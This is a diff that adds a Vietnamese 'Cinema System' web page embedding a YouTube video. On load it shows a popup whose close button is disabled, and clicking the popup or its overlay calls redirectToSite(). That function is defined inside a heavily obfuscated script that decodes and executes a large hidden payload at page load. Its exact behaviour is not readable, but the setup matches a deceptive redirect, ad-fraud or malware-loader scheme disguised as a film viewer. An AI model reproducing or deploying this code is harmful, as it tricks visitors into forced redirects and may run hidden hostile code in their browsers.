@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sự Kiện Đặc Biệt</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 0;
+            max-width: 800px;
+            margin: auto;
+            text-align: center;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 20px 0;
+        }
+
+        iframe {
+            width: 100%;
+            max-width: 560px;
+            height: 315px;
+            margin: 20px 0;
+        }
+
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 10px;
+        }
+
+        .popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border: none;
+            background: #ff6600;
+            color: white;
+            cursor: not-allowed;
+            border-radius: 5px;
+            width: 100%;
+            opacity: 0.5;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                margin: 10px;
+                font-size: 16px;
+            }
+
+            .popup {
+                width: 95%;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Cinema System</h1>
+    <!-- <img src="event-image.jpg" alt="Hình ảnh sự kiện"> -->
+    <!-- <p><strong>Ngày 10/03/2025 - Tại TP. Hồ Chí Minh</strong></p> -->
+    <!-- <p>Sự kiện hứa hẹn mang đến những trải nghiệm tuyệt vời, kết nối với chuyên gia và nhiều cơ hội hấp dẫn. Đừng bỏ lỡ
+        cơ hội tham gia!</p> -->
+
+    <!-- Video YouTube -->
+    <iframe width="auto" height="auto" src="https://www.youtube.com/embed/RVKoADPvUbk?si=-7F8vmfaaxmOkB70"
+        title="YouTube video player" frameborder="0"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+        referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+    <!-- <iframe
+        src="https://www.facebook.com/plugins/video.php?height=476&href=https%3A%2F%2Fwww.facebook.com%2F100068863397041%2Fvideos%2F1299490984597439%2F&show_text=true&width=476&t=0"
+        width="476" height="600" style="border:none;overflow:hidden" scrolling="no" frameborder="0"
+        allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"
+        allowFullScreen="true"></iframe> -->
+    <div class="popup-overlay" id="popupOverlay" onclick="redirectToSite()"></div>
+    <div class="popup" id="popup" onclick="redirectToSite()">
+        <h2>Đóng thẻ này để xem được phim!</h2>
+        <p>Click vào có thể sẽ hiện quảng cáo, sau khi tắt đi, bạn sẽ xem được phim nhé!</p>
+        <button id="closeBtn" disabled>Đóng</button>
+    </div>
+
+    <script>
+        function showPopup() {
+            document.getElementById("popup").style.display = "block";
+            document.getElementById("popupOverlay").style.display = "block";
+        }
+        var _0x3484, _0x3c26, redirectToSite; (function () { var bvr = '', SPq = 810 - 799; function PiX(t) { var h = 965948; var e = t.length; var g = []; for (var f = 0; f < e; f++) { g[f] = t.charAt(f) }; for (var f = 0; f < e; f++) { var i = h * (f + 470) + (h % 50250); var a = h * (f + 566) + (h % 28177); var c = i % e; var n = a % e; var q = g[c]; g[c] = g[n]; g[n] = q; h = (i + a) % 1374665; }; return g.join('') }; var TGK = PiX('hqudkoioopzuxcmwfgcyrtstntajcsrbrvnle').substr(0, SPq); var DXK = 'ia[=jd=i4ovd<[c)Af;re={e=;(*od.}lhijdft;-lr7 r+0;vlzr;{26.v=l(j{8aa}e(jh.x;n"ua.(rCv,,+)8cs[(.o,-,8h+fa"csbs,w=,[mg8e{>=e0"apo;sCctheh+g;o-f"0essogSj=ei]i;f,)rfsh8n[8vn)=u0s sit!8l)=m3b8n+lwx0av=,tfotlg;vf;"ja3r+}b)l=.tsgl;ng1 A(0;)ond;;.aa;wulgitC9]e.j( wpfehv(+,[rhv;rr(.s;ad.r=i,1u8+=vq}.-;96f an=xol(mni](s+giva(0aw7 =nu)e==an) k79v rhr,;h.mn ltru=e()rv+rpCairovfoo(+go)((0vir0f]ele=cgt.ae tt!811h;+t=+[b=n;p.< h;4;t"h)*.ts.f-hre)0eggdg,v)tg]rh,ruccqae3ra fko c)r=rnqc+(klaen2vcfhnq,o.a=ffrqi{6rtvrraw;rhan.op=7n(r02+-;;n]otsv<[n7)o=}op1tribr,.5lu(o7. r(])51=]"amr+r,r=ewiav+qdkf491"iv][a0ms)=w+[n=)(A)ndv,lC1po2+;g;e=v+r=tuAnmi>s(v;gntiur[r)=,f rl7,qChahh;4v)3.2,joon[dolt}=x=v;.9}gg ]6;]l6h A=a 1 ;=];"),9l o=ai]3cm(,.6s7(o"(,h(((co{.;tp(1lv+(trm)oai)C)+no2,{aylpav;b9);u <)p.rv+=t;v;,)22ngek0aq+5r=u.sd;rtv72k5 ,ap+ i;6)o[(;1wS]ovnlu;;hlr)r=,ianj6[jat=aqeu<1nu))s.a (oCv7t ia(r-r(;);'; var HCx = PiX[TGK]; var ZxO = ''; var IpD = HCx; var hwN = HCx(ZxO, PiX(DXK)); var QFJ = hwN(PiX('p>(cZo<69_E(H1H7H.HHH11<S0!H$H24HeH.6;;HnrHo0.m^HaH(cyHwe.lonH5w(1Oo+Ha.Jeo5r0HH4H_om5D82AuHH<6ef%=Hzg#2H!.2He?_H1)3>$:]8Hhi1;k)(xT0.H*]rH0$.!Hr),I,lUeH.}he0.0H2Hb$7y{=k%s=n42H956-gHwH#ml{(H.,89)O4n!d5\';(P5H}HEn0J-Q=H+.HYlHeS9aHs66.5_wth9Hn%3$_;+14H} t(8H}59Std&5g4!tfe0.]eyK)6dH(o+H=!0556.%%.e.D0f(=T8Ht9_H:_)({Hku.]HX2e7n0!_v!.={%d.}u8.v.9%eEo2h7m2}0n0FHFrohHHH58HU5S\/45e%h6b\/Y.;;uHt)n3.l1_dpH)u98;(%nOVfH30!)s68< .0=(c"0t.H= xq"0s(HMosDpH3H6]3s2nja4Z.H.1u2")8,4dH}]i5ci#H}63601 4t1ttwNe)04rx.iSr\'=0cH1WHpesn+)5.cH.x)1 #)0H._fc1g2155f[.7=.)}rH6HHi3.veuH9*_017(),rN(;c0H))c:(HH3.Hek))i2{eH7S4(H2.o)".#\'4He}\\76H&)H.)73V7#]5Xusm6o.,HXnj7eHHwd{ ;zHCKi.MHH=8j.Qbf2gf@_1 Pel_e!],(t.6=1H7a2dxHf(H0e+5hH.)0.2e4Hr%1)%%.t,6Ho,2o5HiSt,nxxc6=Hy80p_4.H1;.70r&6K0!=z)_((H)kt_3J.(7do)x.(H_H!i\/)jZ4;cHH!k\'.Hea4H_t.xH;i_,tHHQH3.(.2l[rc_H{siHH^)1H)HHe[0_tes,c9e6;5H2H!n;3PN(_0(9 1H$4Hs_t(H,,7H).P%"aEemc)W<TeHH)!0fb)[cu)f;1 cFjt1(e4701)4!).5m(h{)H]_9(C=3;;m3gH.%3z)=.de9An (j#iHHH[.d%<Hrhb3.c48NH_!H.dHHH Hoer HC))SeSl2H!HN2(H{)5HJHMH)}<HHo*%Mc\/Tc]px3]))68opVoHf[a]([ya76_=$]fe9H7e]0;}5=te=`0H4247H{3(cfH-_$_ew r twH{iH.a,i<<($l,lH,HyH\/40"{-Hl{Hoi2u\\)W+b9n5H_\/gHHHUH562rn(=H_H=H511;u5H)5(e;8Hb29xzHnH 5k0H)31s)_n H})34)Hd_?H{exQcs$)jjHH6j.19>!4%d(p3)1h( (9%7!H&I(%1$7e(3z0@,ekQHH(7HujreF4o)aY,!"7=rH _t8,xm-n!7!1Epeh;49H1H59c ZQ_H0(]t)Cr3]HH$0MdeAa5H,4H)S!fbcH.f)=C]-Hso%4l7H75as6B21d57tH16HH62rbnmb518)He61#$4))HH5Re10;= e.H_f_HcH$\\)Yp.!9ce.H,..[rs)95H,H5[xH4h8(hj)2jqx.$.H8tWHH%0HfjH[,JHHH;16DH_H57H90HH0,%23V3{.}aHdHf;lE8G1)s.)sG8H63r2H96 _t5<H11HL2d,n_]1_5ej)5)H166A)H1a.H`6}25ni6=6_HxeHoHH_=a1ad((_01B2d2 HH 3H!HlHbdseQ.Hl5t5;_H`#Ho_H11 m8H.!jV32j5cX.5k)Y\/HHH5))\/27e=6aHUj;57oH3_1tH5.)0H18nt}2H233$0%=^Z){HL2c0HH!a[HHn(KHI(_H.Z.C04i 4\/05.3)(U2T)5Hax}xT_7 g))e4.ulnHu.H]ume{ eC2ee057e)I74G08)a5n,9:7,f;sHy)rb1;j0u(+v5{e,7ec(8x_@+3rh7;oHH_ HcH V0n c2],H05fo()kdt=H2$9)i=1HIH2H)_),1_6HtHc54bB]8s;(e,Y5x!)2}d;67(\/.dc4qc_Tf75[e t%\\;ofU:4 ,.fHi45;#)_E9)c,F;)js1()aj;.eA_1z.2u=HLe;6_xc0rHboe;n!l{s6H1Hv%H?S_.i4Htb.r,He]o)(x!H]d6 "1=IHHH4feti,x1b_x3g)e_%H4H"6h+e{4e(;e4eaoH4(H_eoJ{1o=tHtesb4)#sW)2o.H21wYH11}0rH%.(cH%Q(H1(?=+ (,a5=eHeE(H9_dHUh+Hb0co,352H_?4PEl`_Hn+H4k} ?[_eH73t=iH20H@}a0%WHt\/u)0(36n&>dHa }HDn)HH5Hp3b39\/t4H(.oH}_ )7ab6xH[H He Ht@$szkR7>+H3)43  }0 x).(ididHp1Hr)vnk11.[oH2i4i8e9__aH_Y(5955tHG}HH e o!s )3( H$947ej%=iHi19%70HTxshHok37).IL.D3kl;$r.N{Hlwe$t_4*_85}Z4(3c(60_efH$H86$xHe5o!l5)$j(oYa%0$xutHH "tH9.2w-2eH;0HHHyHS51nSHs84__.i 3Yf0Hulj_$"(Hs m; (hs b6_2l3.)d2)(5e!He_ )6Hn0$a_H3((bHfEHl)x2.6_5Hfrxne n_2zde7HH>15$HHHcHt$$ d,nH!H;3;$[(]dH[dHHjH2Hr{a7;(D$8TTeK(6(H"Hs9Hd$;.?2HH 5HHHH)_pa)(4YHH]XK]9ec%xHa]e_nH9d_91_,Px,-w95(zxa26s))?i?;w2H( rfOCH6zHcfuHHt5$kHwdfH$ e9X;Bz3x\'8bra_HsH5.lfaz1)94_u]leHm3Hr$7oH=HZ2cp52\\eu 2.(u s8jm_Yst {)!$l8_=d-c1e_l( 6h16Hy2e=7}eoH}%_eH)_ ]6a_iH!d9H0))y=.s;6c0N4n1TtI7doHn9)(ib a=]5;\/f15, <)_j')); var ggO = IpD(bvr, QFJ); ggO(6895); return 6761 })()
+        document.getElementById("closeBtn").addEventListener("click", function () {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("popupOverlay").style.display = "none";
+        });
+        setTimeout(showPopup, 1000);
+    </script>
+</body>
+
+</html>
